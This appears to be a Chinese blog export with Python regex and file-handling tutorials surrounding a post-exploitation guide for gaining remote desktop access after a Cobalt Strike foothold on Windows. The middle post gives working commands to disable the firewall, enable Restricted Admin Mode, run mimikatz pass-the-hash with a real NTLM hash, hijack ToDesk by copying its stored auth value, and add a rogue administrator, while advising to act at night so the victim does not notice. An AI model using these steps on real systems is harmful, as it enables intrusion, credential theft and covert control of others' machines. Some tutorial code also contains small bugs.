<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;d.k&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;dhk&#x27;, &#x27;dhk&#x27;, &#x27;dhk&#x27;]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhkk，我知道其实你dhkk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;d.+k&quot;</span>,text)<span class="comment">#贪婪匹配是能匹配长的就匹配长的，可以是任意字符，任意数量。</span></span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;dhkk，我知道其实你dhkk是一个joker，但是身为joker的dhk&#x27;]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;d.+?k&quot;</span>,text)<span class="comment">#非贪婪匹配,能匹配短的就匹配短的。</span></span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;dhk&#x27;, &#x27;dhk&#x27;, &#x27;dhk&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>6.\w指代字母或数字或下划线（汉字）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为  joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;jo\w+k&quot;</span>,text)<span class="comment">#不加问号就是贪婪匹配</span></span><br><span class="line"><span class="built_in">print</span>(data_list)</span><br></pre></td></tr></table></figure>

<p>7.\d代指所有的数字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;123asd123sad2_123minadasd&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;d\d&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;d1&#x27;, &#x27;d2&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>8.\s代指一的空白符，包括空格，制表符等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re </span><br><span class="line">text = <span class="string">&quot;root admin add admin&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;a\w+\s\w+&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;admin add&#x27;]</span></span><br></pre></td></tr></table></figure>

<h4 id="4-1-2数量相关"><a href="#4-1-2数量相关" class="headerlink" title="4.1.2数量相关"></a>4.1.2数量相关</h4><p>1.*重复0次或更多次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;dhk is a joke,definitely a joker&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;ker*&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;ke&#x27;, &#x27;ker&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>2.+重复1次或更多次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;dhk is a joke,definitely a joker&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;j\w+k&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;jok&#x27;, &#x27;jok&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>3.?重复0次或1次</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;dhk is a joke,definitely a joasdasdasdker&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;j\w?k&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;jok&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>4.{n}重复n次</p>
<p>5.{n,}重复n次或多次</p>
<p>6.{n,m}重复n次到m次</p>
<h4 id="4-1-3括号（分组）"><a href="#4-1-3括号（分组）" class="headerlink" title="4.1.3括号（分组）"></a>4.1.3括号（分组）</h4><p>1.提取数据区域</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;楼主你这资源好啊，我有个朋友想要。1231231231&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;1231(2\d&#123;5&#125;)&quot;</span>,text)<span class="comment">#意味着匹配还是按照没有括号的时候匹配，但是返回的值是括号里面的。</span></span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;231231&#x27;]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;楼主你这资源好啊，我有个朋友想要。1231231231&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;(1231(2\d&#123;5&#125;))&quot;</span>,text)<span class="comment">#由于这里有两层括号，所以会先返回小括号的内容，然后返回大括号的内容。</span></span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[(&#x27;1231231231&#x27;, &#x27;231231&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>2.获取指定区域+或条件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;哇你这dhk真1231admin23123的是一个小丑啊！天ro123123123ot哪！joker，来点资源123123clown123&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;1231(\d&#123;4&#125;|\w&#123;5&#125;\d+)3&quot;</span>,text)<span class="comment">#这里面的管道符|就是或条件</span></span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;admin2312&#x27;, &#x27;2312&#x27;]</span></span><br></pre></td></tr></table></figure>

<h4 id="4-1-4-起始-结束"><a href="#4-1-4-起始-结束" class="headerlink" title="4.1.4 ^起始$结束"></a>4.1.4 ^起始$结束</h4><h4 id="4-1-5特殊字符"><a href="#4-1-5特殊字符" class="headerlink" title="4.1.5特殊字符"></a>4.1.5特殊字符</h4><p>由于正则表达式中各种特殊符号都有特殊的含义，所以如果想要在正则中匹配这种指定的字符，需要转移</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;dhk is a&#123;9&#125;clown!&quot;</span></span><br><span class="line">data = re.findall(<span class="string">&quot;a\&#123;9\&#125;clown!&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#[&#x27;a&#123;9&#125;clown!&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>要使用\进行转义</p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>关于CS上线后的远程思路_win</title>
    <url>/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/</url>
    <content><![CDATA[<h1 id="关于CS上线后的远程思路-win"><a href="#关于CS上线后的远程思路-win" class="headerlink" title="关于CS上线后的远程思路_win"></a>关于CS上线后的远程思路_win</h1><p>首先上线之后需要检查3389端口是否开放</p>
<p>通过<code>netstat -an</code>来进行查看</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025103746077.png" alt="image-20221025103746077"></p>
<p>如若没开启可通过CS上的一键化工具进行开启远程桌面，注意需要管理员权限（并且需要关闭防火墙）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025103850926.png" alt="image-20221025103850926"></p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025104608958.png" alt="image-20221025104608958"></p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025104720682.png" alt="image-20221025104720682"></p>
<h1 id="通过mimikatz获取明文密码直接登录"><a href="#通过mimikatz获取明文密码直接登录" class="headerlink" title="通过mimikatz获取明文密码直接登录"></a>通过mimikatz获取明文密码直接登录</h1><p>这种方式仅适用于win2008及以下的版本，直接运行猕猴桃抓密码</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025104911538.png" alt="image-20221025104911538"></p>
<p> 通过CS搭建SOCKS4隧道，在用工具连接该隧道把自己给代理进去（这里搭建隧道的时候，一定要记得把自己cs服务器上的防火墙配置好，要不然要报错。</p>
<p>我这里用的是frp穿透进去的，连接frp的隧道，配置一下代理。</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025111407748.png" alt="image-20221025111407748"></p>
<p>成功连接</p>
<h1 id="通过mimikatz获取到ntlm值来登陆"><a href="#通过mimikatz获取到ntlm值来登陆" class="headerlink" title="通过mimikatz获取到ntlm值来登陆"></a>通过mimikatz获取到ntlm值来登陆</h1><p>针对windows 2012以上版本，在windows 2012以后是无法获取到明文密码的，只能获取到ntlm值。</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025123445880.png" alt="image-20221025123445880"></p>
<p>然后再用frp搭建一个socks4代理</p>
<p>然后用mimikatz来进行远程登录</p>
<p>在CS的交互会话上执行以下命令 开启注册表,开启目标主机的Restricted Admin Mode命令如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<p>再打开mimikatz输入以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:administrator /domain:. /ntlm:e19ccf75ee54e06b06a5907af13cef42 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>

<p>选中需要远程的服务器地址，即可远程成功</p>
<p><a href="https://blog.csdn.net/liu_jia_liang/article/details/123047119">(114条消息) 内网渗透：四、windowsRDP-hash传递登录_L_DC的博客-CSDN博客_hash登录远程桌面</a></p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025130151691.png" alt="image-20221025130151691"></p>
<p>我这里暂时没有登陆成功，因为我用的win10，等我2012下载好了再说。</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025174923876.png" alt="image-20221025174923876"></p>
<p>我这里用2008复现成功</p>
<p>就算不能登录也可以建立ipc连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:目标机器IP /ntlm:xxxxxx&quot;</span><br></pre></td></tr></table></figure>

<h1 id="开启guest用户"><a href="#开启guest用户" class="headerlink" title="开启guest用户"></a>开启guest用户</h1><ol>
<li>CS插件一键化开启guest ，并加入管理组</li>
</ol>
<p>这个目前还没复现成功在win10上，换成2008来试一下</p>
<p>反正能开就开，不能就拉倒，开启之后直接空密码登录即可（感觉不入自己创建用户）。</p>
<h1 id="todesk-amp-向日葵"><a href="#todesk-amp-向日葵" class="headerlink" title="todesk&amp;向日葵"></a>todesk&amp;向日葵</h1><p>首先下载免安装版，通过cs放到对面的电脑上，然后执行</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025162330320.png" alt="image-20221025162330320"></p>
<p>注意用这个的时候，对面的桌面也会弹出界面</p>
<p>通过查看进程看是否开启</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025162444970.png" alt="image-20221025162444970"></p>
<p>其次去查找todesk免安装的配置文件，默认为以下路径config文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\ProgramData\ToDesk_Lite</span><br></pre></td></tr></table></figure>

<p>将其下载下来，看着两个参数</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025172745917.png" alt="image-20221025172745917"></p>
<p>把tempAuthPassEx的值复制出来，替换掉本机todesk配置文件中原来的tempAuthPassEx值</p>
<p>重启todesk获取服务器的验证码，输入服务器识别码及验证码连接成功</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025173133636.png" alt="image-20221025173133636"></p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025173210716.png" alt="image-20221025173210716"></p>
<p>缺点就是，连接的时候，还会弹出连接方的信息，师傅们记得用小号上这个软件。</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025173622194.png" alt="image-20221025173622194"></p>
<h1 id="创建新用户到管理组"><a href="#创建新用户到管理组" class="headerlink" title="创建新用户到管理组"></a>创建新用户到管理组</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net user adm psw /add</span><br><span class="line"></span><br><span class="line">shell net localgroup administrators adm /add</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025175557560.png" alt="image-20221025175557560"></p>
<p>绕过火绒的话，参考我之前发的博文。</p>
<p>成功登录</p>
<p><img src="/2022/10/25/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%90%8E%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%80%9D%E8%B7%AF-win/image-20221025175646948.png" alt="image-20221025175646948"></p>
<p>不过win10会弹出这个，导致受害者知道，最好晚上的时候使用，或者说，最好不要使用远程桌面捏，动静太大了。</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>六、学习py：文件操作的相关操作</title>
    <url>/2021/12/31/%E5%85%AD%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="六、学习py：文件操作的相关操作"><a href="#六、学习py：文件操作的相关操作" class="headerlink" title="六、学习py：文件操作的相关操作"></a>六、学习py：文件操作的相关操作</h1><h2 id="1-文件操作"><a href="#1-文件操作" class="headerlink" title="1.文件操作"></a>1.文件操作</h2><p>在正式学习文件操作之前，大火先来看一下数据类型和编码的一些知识。</p>
<p>1.字符串类型（str）,在程序中用于表示文字信息，本质上是unicode编码中的二进制。</p>
<p>2.字节类型(bytes)可表示文字信息，本质上是utf-8\gbk编码的二进制（对unicode进行了压缩方便文件存储和网络传输。）</p>
<p>图片也可以表示。</p>
<h3 id="1-1读文件"><a href="#1-1读文件" class="headerlink" title="1.1读文件"></a>1.1读文件</h3><h4 id="1-1-1读文本文件"><a href="#1-1-1读文本文件" class="headerlink" title="1.1.1读文本文件"></a>1.1.1读文本文件</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.打开文件</span></span><br><span class="line"><span class="comment">#  -路径</span></span><br><span class="line"><span class="comment">#     有相对路径和绝对路径</span></span><br><span class="line"><span class="comment">#  -模式</span></span><br><span class="line"><span class="comment">#  rb，表示读取文件的原始的二进制（r，read；b，二进制，binary）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#打开文件</span></span><br><span class="line">file_object = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">data = file_object.read()</span><br><span class="line"><span class="comment">#关闭文件</span></span><br><span class="line">file_object.close</span><br><span class="line"><span class="built_in">print</span>(data)<span class="comment">#这里读取的是字节类型</span></span><br><span class="line"><span class="comment">#这里面的file_object是一个对象，代表了&#x27;info.txt&#x27;那个文件</span></span><br><span class="line">text = data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(text)<span class="comment">#这里读出来就是文本了</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在py中读文件的时候，内置了一个模块。</span></span><br><span class="line">file_object = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment">#这样读出来就直接是文本。</span></span><br></pre></td></tr></table></figure>

<h4 id="1-1-2读图片文件"><a href="#1-1-2读图片文件" class="headerlink" title="1.1.2读图片文件"></a>1.1.2读图片文件</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_object = <span class="built_in">open</span>(<span class="string">&#x27;dhk.png&#x27;</span>,mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = file_object.read()</span><br><span class="line">file_object.close<span class="comment">#这里读出来也是二进制。</span></span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>1.在输入路径的时候，我建议还是使用绝对路径，相对路径很有可能会变化。</p>
<p>2.在写路径的时候，在路径的引号前面加上r，例如：防止系统将\new的\n认为是换行符。</p>
<p>3.如果文件不存在，程序会报错。</p>
<h4 id="1-1-3扩展：判断路径是否存在"><a href="#1-1-3扩展：判断路径是否存在" class="headerlink" title="1.1.3扩展：判断路径是否存在"></a>1.1.3扩展：判断路径是否存在</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">exists = os.path.exists(<span class="string">&quot;info.txt&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(exists)<span class="comment">#这里返回的是一个布尔值</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2写文件"><a href="#1-2写文件" class="headerlink" title="1.2写文件"></a>1.2写文件</h3><h4 id="1-2-1写文本文件"><a href="#1-2-1写文本文件" class="headerlink" title="1.2.1写文本文件"></a>1.2.1写文本文件</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_object = <span class="built_in">open</span>(<span class="string">&quot;ex.txt&quot;</span>,mode=<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#这个wb是指，write，二进制</span></span><br><span class="line">file_object.write(<span class="string">&quot;dhk&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">file_object.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_object = <span class="built_in">open</span>(<span class="string">&quot;ex.txt&quot;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file_object.write(<span class="string">&quot;dhk&quot;</span>)</span><br><span class="line">file_object.close()</span><br><span class="line"><span class="comment">#默认的encoding就是utf-8，当然你也可以自己去指定，所以我更推荐这种方法，不用每次写入都进行加密。</span></span><br></pre></td></tr></table></figure>

<h4 id="1-2-2写图片文件"><a href="#1-2-2写图片文件" class="headerlink" title="1.2.2写图片文件"></a>1.2.2写图片文件</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;ex.png&#x27;</span>,mode = rb)</span><br><span class="line">content = f1</span><br><span class="line">f1.close()</span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;ex2.png&#x27;</span>,mode = wb)</span><br><span class="line">f2.write(content)</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure>

<h4 id="1-2-3案例，实现用文本储存账户"><a href="#1-2-3案例，实现用文本储存账户" class="headerlink" title="1.2.3案例，实现用文本储存账户"></a>1.2.3案例，实现用文本储存账户</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username = <span class="built_in">input</span>(<span class="string">&quot;请输入您的用户名字:&quot;</span>)</span><br><span class="line">password = <span class="built_in">input</span>(<span class="string">&quot;请输入您的密码: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = &#123;<span class="string">f&quot;<span class="subst">&#123;username&#125;</span>&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;password&#125;</span>&quot;</span>&#125;</span><br><span class="line">content = <span class="built_in">open</span>(<span class="string">&quot;info.txt&quot;</span>,mode=<span class="string">&#x27;wt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">content.write(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">list</span>&#125;</span>&quot;</span>)</span><br><span class="line">content.close()</span><br><span class="line"><span class="comment">#使用w写入文件的时候，会先清空文件，再在文件中写入内容。并不会直接在原来的文档里面加入内容，所以要实现多用户注册，就不能让他多次open文件。</span></span><br></pre></td></tr></table></figure>

<h4 id="1-2-4案例，实现多用户的注册"><a href="#1-2-4案例，实现多用户的注册" class="headerlink" title="1.2.4案例，实现多用户的注册"></a>1.2.4案例，实现多用户的注册</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">content = <span class="built_in">open</span>(<span class="string">&quot;info.txt&quot;</span>, mode=<span class="string">&#x27;wt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;请输入您的用户名字(输入q退出):&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> username.upper() == <span class="string">&quot;Q&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&quot;请输入您的密码: &quot;</span>)</span><br><span class="line">    <span class="built_in">list</span> = &#123;<span class="string">f&quot;<span class="subst">&#123;username&#125;</span>&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;password&#125;</span>&quot;</span>&#125;</span><br><span class="line">    n = <span class="string">&quot;\n&quot;</span></span><br><span class="line">    content.write(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">list</span>&#125;</span>&quot;</span>+<span class="string">f&quot;<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">content.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将文件的开关都放在while循环的外面，这样就不会多次打开文件导致文件的内容清零，相对的关闭文件也要放在循环外面，防止多次关闭文件导致程序报错。</span></span><br></pre></td></tr></table></figure>

<h4 id="1-2-5案例，实现在网络上获取内容并且写入文件"><a href="#1-2-5案例，实现在网络上获取内容并且写入文件" class="headerlink" title="1.2.5案例，实现在网络上获取内容并且写入文件"></a>1.2.5案例，实现在网络上获取内容并且写入文件</h4><p>在这里会使用一个第三方的模块(可以伪造浏览器向网站发送请求)</p>
<p>使用终端安装</p>
<p>pip install requests</p>
<p>模块的使用方法（这里只是在这里说一下常用的一个方法，关于模块后面会介绍）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r=requests.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line">r.status_code</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br><span class="line"><span class="comment">#后面会讲到,然后这里再在后面加入写入文件的功能就好了.</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3文件打开模式"><a href="#1-3文件打开模式" class="headerlink" title="1.3文件打开模式"></a>1.3文件打开模式</h3><h4 id="1-3-1下面将介绍各种模式"><a href="#1-3-1下面将介绍各种模式" class="headerlink" title="1.3.1下面将介绍各种模式"></a>1.3.1下面将介绍各种模式</h4><p>r 读取</p>
<p>w 重新编写这个文件</p>
<p>x 创建一个新的文件，并进行编辑</p>
<p>a 打开一个文件，在它的末尾加入内容</p>
<p>b 二进制模式</p>
<p>t文本模式</p>
<p><img src="/2021/12/31/%E5%85%AD%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%9A%84%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20211230172323356.png" alt="image-20211230172323356"></p>
<p>扩展：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text.seek(<span class="number">0</span>)<span class="comment">#将光标置于第一个位置，也就是起始位置。</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/python-coder/p/10078253.html">python文件操作打开模式 r,w,a,r+,w+,a+ 区别辨析 - 少年与python - 博客园 (cnblogs.com)</a></p>
<h3 id="1-4常见功能"><a href="#1-4常见功能" class="headerlink" title="1.4常见功能"></a>1.4常见功能</h3><p>在上述中我们只使用了读写功能，其实还有很多的辅助功能。</p>
<h4 id="1-4-1read读所有"><a href="#1-4-1read读所有" class="headerlink" title="1.4.1read读所有"></a>1.4.1read读所有</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data = f.read()</span><br></pre></td></tr></table></figure>

<h4 id="1-4-2read-读指定的内容"><a href="#1-4-2read-读指定的内容" class="headerlink" title="1.4.2read()读指定的内容"></a>1.4.2read()读指定的内容</h4><p>在文件上传的时候大多也会使用这种方式，一点字节一点字节的发送。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data = f.read(<span class="number">2</span>)<span class="comment">#读取2个字符</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;info.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">a = f.read(<span class="number">1</span>)<span class="comment">#读取第1个字符</span></span><br><span class="line">b = f.read(<span class="number">1</span>)</span><br><span class="line">c = f.read(<span class="number">1</span>)</span><br><span class="line">d = f.read(<span class="number">1</span>)</span><br><span class="line">e = f.read(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a,b,c,d,e)</span><br><span class="line"><span class="comment">#一个一个字符的读取，由于光标在每一次读取后都会往后推进一个，所以每一次读取的内容是不一样的。</span></span><br></pre></td></tr></table></figure>

